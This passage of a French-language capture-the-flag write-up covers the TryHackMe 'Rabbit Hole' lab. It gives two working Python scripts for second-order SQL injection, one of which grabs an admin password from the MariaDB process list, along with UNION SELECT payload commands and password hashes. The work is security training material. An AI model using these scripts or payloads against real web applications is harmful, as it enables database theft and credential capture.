</span></span><span style=display:flex><span>            <span style=color:#c678dd>if</span> <span style=color:#e06c75>col_content</span>:  <span style=color:#7f848e># If there&#39;s a non-numeric column</span>
</span></span><span style=display:flex><span>                <span style=color:#e06c75>col</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;SUBSTRING(</span><span style=color:#98c379>{</span><span style=color:#e06c75>col</span><span style=color:#98c379>}</span><span style=color:#98c379>, </span><span style=color:#98c379>{</span><span style=color:#e06c75>substring_range</span>[<span style=color:#d19a66>0</span>]<span style=color:#98c379>}</span><span style=color:#98c379>, </span><span style=color:#98c379>{</span><span style=color:#e06c75>substring_range</span>[<span style=color:#d19a66>1</span>]<span style=color:#98c379>}</span><span style=color:#98c379>)&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e06c75>modified_columns</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>append</span>(<span style=color:#e06c75>col</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#e06c75>modified_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span>[:<span style=color:#e06c75>select_pos</span>] <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#39;SELECT &#39;</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#39;, &#39;</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>(<span style=color:#e06c75>modified_columns</span>) <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#39; &#39;</span> <span style=color:#56b6c2>+</span> <span style=color:#e06c75>rest_of_query</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>modified_payload</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>) <span style=color:#56b6c2>!=</span> <span style=color:#d19a66>3</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Usage: python3 auto_sqli.py &lt;IP_ADDRESS&gt; &lt;PAYLOAD&gt;&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>exit</span>(<span style=color:#d19a66>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>ip</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#e06c75>original_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>2</span>]
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#e06c75>first_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>modify_payload</span>(<span style=color:#e06c75>original_payload</span>, (<span style=color:#d19a66>1</span>, <span style=color:#d19a66>16</span>))
</span></span><span style=display:flex><span>    <span style=color:#e06c75>second_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>modify_payload</span>(<span style=color:#e06c75>original_payload</span>, (<span style=color:#d19a66>17</span>, <span style=color:#d19a66>32</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[+] Creating user with first payload: </span><span style=color:#98c379>{</span><span style=color:#e06c75>first_payload</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e06c75>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>first_payload</span>):
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] User created successfully. Attempting first login...&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>first_response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>first_payload</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>first_results</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>extract_results</span>(<span style=color:#e06c75>first_response</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[+] Creating user with second payload: </span><span style=color:#98c379>{</span><span style=color:#e06c75>second_payload</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#e06c75>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>second_payload</span>):
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] User created successfully. Attempting second login...&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#e06c75>second_response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>second_payload</span>)
</span></span><span style=display:flex><span>            <span style=color:#e06c75>second_results</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>extract_results</span>(<span style=color:#e06c75>second_response</span>)
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[+] Combined results:&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#e5c07b>len</span>(<span style=color:#e06c75>first_results</span>)):
</span></span><span style=display:flex><span>                <span style=color:#e06c75>full_result</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>first_results</span>[<span style=color:#e06c75>i</span>]
</span></span><span style=display:flex><span>                <span style=color:#c678dd>if</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>&lt;</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>second_results</span>) <span style=color:#56b6c2>and</span> <span style=color:#e06c75>second_results</span>[<span style=color:#e06c75>i</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>():
</span></span><span style=display:flex><span>                    <span style=color:#e06c75>full_result</span> <span style=color:#56b6c2>+=</span> <span style=color:#e06c75>second_results</span>[<span style=color:#e06c75>i</span>]
</span></span><span style=display:flex><span>                <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;  - </span><span style=color:#98c379>{</span><span style=color:#e06c75>full_result</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[-] Failed to create user for second query.&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[-] Failed to create user. Check the payload or connection.&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#e06c75>__name__</span> <span style=color:#56b6c2>==</span> <span style=color:#98c379>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>main</span>()
</span></span></code></pre></div><p><img src=/images/THM-RabbitHole/full_hashes.png alt="full hashes"></p><pre tabindex=0><code>0e3ab8e45ac1163c2343990e427c66ff
a51e47f646375ab6bf5dd2c42d3e6181
de97e75e5b4604526a2afaed5f5439d7
</code></pre><p>Nous n&rsquo;arrivons pas à craquer le hash <code>admin</code> et bien que nous craquions les deux autres hashs, nous ne pouvons pas utiliser les mots de passe pour nous connecter via SSH.</p><p><img src=/images/THM-RabbitHole/foobar_pwd.png alt="cracked passwords"></p><p><img src=/images/THM-RabbitHole/failed_SSH.png alt="failed SSH logins"></p><p>Nous vérifions également la table <code>logins</code> mais elle ne contient que <code>username</code> et <code>login_time</code> ce qui n&rsquo;est pas utile.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=&#34;logins&#34; AND table_schema=DATABASE(); --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/logins_table.png alt="logins table"></p><p>Voyons quelle(s) autre(s) base(s) de données nous avons.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, schema_name FROM information_schema.schemata; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/full_db_names.png alt="full databases names"></p><p>Outre la base de données <code>web</code>, nous avons la base de données <code>information_schema</code>.</p><h2 id=extraction-de-requêtes-sql>Extraction de requêtes SQL</h2><blockquote><p>Tout le mérite de cette partie revient à <code>jaxafed</code> dont l&rsquo;article est disponible <a href=https://jaxafed.github.io/posts/tryhackme-rabbit_hole/#extracting-the-current-queries>ici</a>. Je n&rsquo;ai pas été capable de faire le lien entre les connexions automatiques et la base de données.</p></blockquote><p>À ce stade, nous avons épuisé un grand nombre d&rsquo;options, mais il reste encore des pistes à explorer. Rappelez-vous que nous avions remarqué que l&rsquo;utilisateur <code>admin</code> se connectait <strong>toutes les minutes</strong>, ce qui indique manifestement une sorte d&rsquo;automatisation.</p><p>Il s&rsquo;avère que nous pouvons utiliser la commande <code>PROCESSLIST</code> pour voir quelles requêtes sont effectuées en arrière-plan et si notre timing est bon, le mot de passe de l&rsquo;administrateur sera exposé. <em>Plus d&rsquo;informations sur <code>PROCESSLIST</code> <a href=https://mariadb.com/kb/en/information-schema-processlist-table/>ici</a>.</em></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#7f848e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>requests</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>sys</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>bs4</span> <span style=color:#c678dd>import</span> <span style=color:#e06c75>BeautifulSoup</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>threading</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>time</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>url_base</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>1</span>]
</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>2</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>sessions</span> <span style=color:#56b6c2>=</span> {}
</span></span><span style=display:flex><span><span style=color:#e06c75>results</span> <span style=color:#56b6c2>=</span> {}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>create_and_login</span>(<span style=color:#e06c75>i</span>, <span style=color:#e06c75>sqli_payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>s</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>session</span>()
</span></span><span style=display:flex><span>    <span style=color:#e06c75>s</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url_base</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34;register.php&#34;</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span>{<span style=color:#98c379>&#34;username&#34;</span>: <span style=color:#e06c75>sqli_payload</span>, <span style=color:#98c379>&#34;password&#34;</span>: <span style=color:#98c379>&#34;jxf&#34;</span>, <span style=color:#98c379>&#34;submit&#34;</span>: <span style=color:#98c379>&#34;Submit Query&#34;</span>})
</span></span><span style=display:flex><span>    <span style=color:#e06c75>s</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url_base</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34;login.php&#34;</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span>{<span style=color:#98c379>&#34;username&#34;</span>: <span style=color:#e06c75>sqli_payload</span>, <span style=color:#98c379>&#34;password&#34;</span>: <span style=color:#98c379>&#34;jxf&#34;</span>, <span style=color:#98c379>&#34;login&#34;</span>: <span style=color:#98c379>&#34;Submit Query&#34;</span>})
</span></span><span style=display:flex><span>    <span style=color:#e06c75>sessions</span>[<span style=color:#e06c75>i</span>] <span style=color:#56b6c2>=</span> <span style=color:#e06c75>s</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>fetch_query_result</span>(<span style=color:#e06c75>i</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>r</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sessions</span>[<span style=color:#e06c75>i</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>get</span>(<span style=color:#e06c75>url_base</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>soup</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>BeautifulSoup</span>(<span style=color:#e06c75>r</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>text</span>, <span style=color:#98c379>&#34;html.parser&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>tables</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>soup</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>find_all</span>(<span style=color:#98c379>&#34;table&#34;</span>, <span style=color:#e06c75>class_</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;u-full-width&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>output</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>tables</span>[<span style=color:#d19a66>1</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>find</span>(<span style=color:#98c379>&#34;td&#34;</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>get_text</span>()
</span></span><span style=display:flex><span>    <span style=color:#e06c75>results</span>[<span style=color:#e06c75>i</span>] <span style=color:#56b6c2>=</span> <span style=color:#e06c75>output</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>threads</span> <span style=color:#56b6c2>=</span> []
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#d19a66>15</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>sqli_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#39;&#34; UNION SELECT 1, SUBSTR((</span><span style=color:#98c379>{</span><span style=color:#e06c75>payload</span><span style=color:#98c379>}</span><span style=color:#98c379>), </span><span style=color:#98c379>{</span><span style=color:#e06c75>i</span> <span style=color:#56b6c2>*</span> <span style=color:#d19a66>16</span> <span style=color:#56b6c2>+</span> <span style=color:#d19a66>1</span><span style=color:#98c379>}</span><span style=color:#98c379>, 16);#&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>thread</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>threading</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>Thread</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>create_and_login</span>, <span style=color:#e06c75>args</span><span style=color:#56b6c2>=</span>(<span style=color:#e06c75>i</span>, <span style=color:#e06c75>sqli_payload</span>))
</span></span><span style=display:flex><span>    <span style=color:#e06c75>threads</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>append</span>(<span style=color:#e06c75>thread</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>thread</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>start</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> <span style=color:#e06c75>thread</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>threads</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>thread</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>while</span> <span style=color:#e5c07b>True</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>threads</span> <span style=color:#56b6c2>=</span> [<span style=color:#e06c75>threading</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>Thread</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>fetch_query_result</span>, <span style=color:#e06c75>args</span><span style=color:#56b6c2>=</span>(<span style=color:#e06c75>i</span>,)) <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#d19a66>15</span>)]
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>thread</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>threads</span>:
</span></span><span style=display:flex><span>        <span style=color:#e06c75>thread</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>start</span>()
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>thread</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>threads</span>:
</span></span><span style=display:flex><span>        <span style=color:#e06c75>thread</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#7f848e># check that we are not missing any part of the result</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e5c07b>all</span>([<span style=color:#e5c07b>len</span>(<span style=color:#e06c75>results</span>[<span style=color:#e06c75>i</span>]) <span style=color:#56b6c2>&lt;=</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>results</span>[<span style=color:#e06c75>i</span> <span style=color:#56b6c2>-</span> <span style=color:#d19a66>1</span>]) <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#d19a66>1</span>, <span style=color:#d19a66>15</span>)]):
</span></span><span style=display:flex><span>        <span style=color:#e06c75>result</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;&#34;</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>([<span style=color:#e06c75>results</span>[<span style=color:#e06c75>i</span>] <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#d19a66>0</span>, <span style=color:#d19a66>15</span>)])
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>result</span>) <span style=color:#56b6c2>&gt;</span> <span style=color:#d19a66>16</span>:
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#e06c75>result</span>)
</span></span><span style=display:flex><span>            <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>exit</span>(<span style=color:#d19a66>0</span>)
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>    <span style=color:#e06c75>time</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sleep</span>(<span style=color:#d19a66>1</span>)
</span></span></code></pre></div><p>Nous devons capturer la requête lorsque l&rsquo;administrateur se connecte, c&rsquo;est-à-dire toutes les minutes, ce qui peut nécessiter d&rsquo;exécuter le script plusieurs fois afin d&rsquo;obtenir la bonne requête.</p><p>En utilisant le script créé par <code>jaxafed</code>, nous trouvons la requête révélant le mot de passe.</p><pre tabindex=0><code>python3 admin_sqli.py &#39;http://IP_ADDRESS/&#39; &#39;SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE &#34;%INFO_BINARY%&#34; LIMIT 1&#39;
</code></pre><p><img src=/images/THM-RabbitHole/admin_pwd_retrieval.png alt="admin password retrieval"></p><p>Avec le mot de passe, nous nous connectons via SSH et lisons le drapeau.</p><p><img src=/images/THM-RabbitHole/flag.png alt="flag location"></p><p>Ce défi était un casse-tête mais je l&rsquo;ai vraiment apprécié, probablement parce que l&rsquo;injection SQL est l&rsquo;un de mes points faibles. Si vous souhaitez en apprendre davantage sur les vulnérabilités liées aux injections SQL, je vous recommande le parcours d&rsquo;apprentissage sur les injections SQL de PortSwigger disponible <a href=https://portswigger.net/web-security/learning-paths/sql-injection>ici</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/thm-k2/>&#8592;
Précédent:
THM: K2</a></p><p class=prev-post-date>octobre 24, 2024</p></div><div class=next-post><p><a href=/fr/posts/thm-seetwo/>Suivant:
THM: SeeTwo
&#8594;</a></p><p class=next-post-date>novembre 4, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a><ul><li><a href=#tentative-de-xss>Tentative de XSS</a></li><li><a href=#injection-sql-de-second-ordre>Injection SQL de second ordre</a></li></ul></li><li><a href=#extraction-de-requêtes-sql>Extraction de requêtes SQL</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>